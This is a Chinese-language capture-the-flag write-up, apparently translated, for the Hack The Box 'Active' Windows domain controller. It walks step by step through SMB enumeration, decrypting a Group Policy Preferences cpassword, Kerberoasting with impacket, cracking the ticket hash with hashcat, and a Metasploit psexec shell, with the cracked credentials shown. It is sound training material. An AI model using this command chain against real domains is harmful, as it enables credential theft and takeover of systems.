---
layout:     post
title:      Hackthebox 匿名登录
date:       2018-12-23
author:     Wh0ale
header-img: img/19s_by_wlop-dbsw09i.jpg
catalog: true
tags:
    - Hackthebox
---

### 0x01渗透方法

**扫描网络**

- 打开端口和运行服务（Nmap）

**列举**

- 识别共享文件（Linux4enum）
- 通过匿名登录访问共享文件（smbclient）
- 解密cpassword（Gpprefdecrypt.py）

**通过SMB连接访问Victim的Shell**

- 访问共享文件用户登录
- 获取User.txt

**特权升级**

- 查找服务主体名称（**py**）
- 破解哈希（Hashcat）
- Psexec Exploit（Metasploit）
- 获取root.txt

**演练**

### 0x02扫描网络

注意：由于这些实验室可在线使用，因此它们具有静态IP。Active的IP是10.10.10.100

让我们从我们的基本nmap命令开始，找出开放的端口和服务。

```bash
nmap -sV 10.10.10.100
```



![img](https://i1.wp.com/1.bp.blogspot.com/-dnDjdZCe7Hk/XA-huvjSwRI/AAAAAAAAbrs/hxVCkBaw5pMHEtDhMEF7V0BOgLHfdnCuACLcBGAs/s1600/1.png?w=687&ssl=1)

从Nmap扫描结果可以看出，有很多开放端口及其运行服务，操作系统是Microsoft Windows server 2008：r2：sp1，您还可以读取域名“active.htb”。

### 0x03enum4liux

当我看到端口445打开时，我尝试了永久的蓝色攻击，但我想这是SMB的补丁版本，因此我必须从enum4linux脚本开始。众所周知，它是SMB枚举的最佳脚本。

```python
./enum4liux -S 10.10.10.100
```

它显示了/ Replication共享文件的匿名登录。

![img](https://i0.wp.com/1.bp.blogspot.com/-6NYnddCNXJ8/XA-hv7aplzI/AAAAAAAAbr4/NmNPKL8A4_cytSlmxj4zPLKMrkYUCAiiACLcBGAs/s1600/2.png?w=687&ssl=1)

然后我尝试使用help smbclient访问/ Replication并运行以下命令通过匿名帐户访问此目录：

````
smbclient //10.10.10.100/Replication
````



![img](https://i0.wp.com/2.bp.blogspot.com/-CExPLGoLP5w/XA-hwH3cjXI/AAAAAAAAbr8/RwkVSMwcNqQ86aiXBeb6LgGOZckcbK-5ACLcBGAs/s1600/3.png?w=687&ssl=1)

在这里，我下载了从以下路径中找到的Groups.xml文件：

```
\active.htb\Policies\{31B2F340–016D-11D2–945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```



所以在这里我发现**cpassword**嵌入Groups.xml用户属性值**SVC_TGS**。

![img](https://i2.wp.com/3.bp.blogspot.com/-iHqY36FKTZY/XA-hwbH0PTI/AAAAAAAAbsE/qb9Ps9fw-7AvwJHuZ1rPGZVUYMDfd2f-wCLcBGAs/s1600/4.png?w=687&ssl=1)

​	因此，我从GitHub下载了一个python脚本“Gpprefdecrypt”来解密通过Windows 2008组策略首选项（GPP）添加的本地用户的密码并获取密码：*GPPstillStandingStrong2k18*。

```python
python Gpprefdecrypt.py < cpassword attribute value >
```



![img](https://i0.wp.com/3.bp.blogspot.com/-K9d8NIeuCbI/XA-hwUCxoFI/AAAAAAAAbsA/ssJDj3eoKWc-T5RBvRuxEeFe_V_8a6mEQCLcBGAs/s1600/5.png?w=687&ssl=1)

### 0x04通过SMB连接访问Victim的Shell

使用以上凭证，我们在以下命令的帮助下连接到SMB，并成功捕获我们的第一个标志“user.txt”文件。

```
smbclient //10.10.10.100/Users -U SVC_TGS
```



![img](https://i1.wp.com/1.bp.blogspot.com/-HL_Id7bfKzE/XA-hwwgBwHI/AAAAAAAAbsI/e0RvpZ1igbo3q41bjak3-DkPc9s5WldnQCLcBGAs/s1600/6.png?w=687&ssl=1)

现在，是时候寻找root.txt文件，并且为了获得root.txt文件，我们需要升级root权限，因此我们在本地机器的/ etc /hosts文件中添加Host_IP和Host_name。

![img](https://i0.wp.com/1.bp.blogspot.com/-2oRQ-3p3Qlo/XA-hxIKu-cI/AAAAAAAAbsQ/zER1m4jlfcEjHPUGA1EayqA6-BmAl_eewCLcBGAs/s1600/7.png?w=687&ssl=1)

### 0x05特权升级

在nmap扫描结果中，我们看到端口88对于Kerberos是开放的，因此它们很多是与普通用户帐户关联的一些服务主体名称（SPN）。因此，我们从Github下载并安装**impacket**以使用其python类**GetUserSPN.py**

```python
./GetUserSPNs.py -request -dc-ip 10.10.10.100  active.htb/SVC_TGS:GPPstillStandingStrong2k18
```



我将哈希值复制到文本文件“hash.txt”中进行解密。

![img](https://i0.wp.com/2.bp.blogspot.com/-KGaDNmSAm9k/XA-hxEd4r3I/AAAAAAAAbsM/g0BJz6EY83EnMoBvCIzhJzIpK5yQq0TggCLcBGAs/s1600/9.png?w=687&ssl=1)

然后在hashcat的帮助下我们找到了哈希模式，结果它显示了**13100** for Kerberos 5 TGS-REP etype 23

```
hashcat -h \|grep -i tgs
```



最后，是时候破解哈希并使用rockyou.txt wordlist获取密码。

```
hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force ---show
```



欢呼！！！我们得到了它，Ticketmaster1968为管理员。

![img](https://i0.wp.com/4.bp.blogspot.com/-QzhxJqW15ao/XA-huoedgyI/AAAAAAAAbro/iBkNybKZJ_I35csgIbNqJXRJpOgydIv3QCLcBGAs/s1600/10.png?w=687&ssl=1)

在没有浪费时间的情况下，我加载了metaploit框架并运行以下模块来生成完整的权限系统shell。

```
msf > use exploit/windows/smb/psexec
msf > exploit windows/smb/psexec) > set rhost 10.10.10.100
msf > exploit(windows/smb/psexec) > set smbuser administrator
msf > exploit(windows/smb/psexec) > set smbpass Ticketmaster1968
msf > exploit(windows/smb/psexec) > exploit
```



**现在我们在root shell中，让我们追逐root.txt文件并完成这个挑战。**

**![img](https://i2.wp.com/2.bp.blogspot.com/-axCn2RU2x5c/XA-huvqLjaI/AAAAAAAAbrw/rxxeWtfAFYw_OdkaPxsNNHAXpXbwCGYUgCLcBGAs/s1600/12.png?w=687&ssl=1)**

**Yuppieee！我们发现我们的第二个标志是/ Users / Administrator / Desktop中的root.txt文件格式。**

**![img](https://i1.wp.com/4.bp.blogspot.com/-EQvO6hoxWN8/XA-hvbJNxfI/AAAAAAAAbr0/KYIqruBleQYhEy7BAb2wYaFbKvcnreTCQCLcBGAs/s1600/13.png?w=687&ssl=1)**



翻译文章：https://www.hackingarticles.in/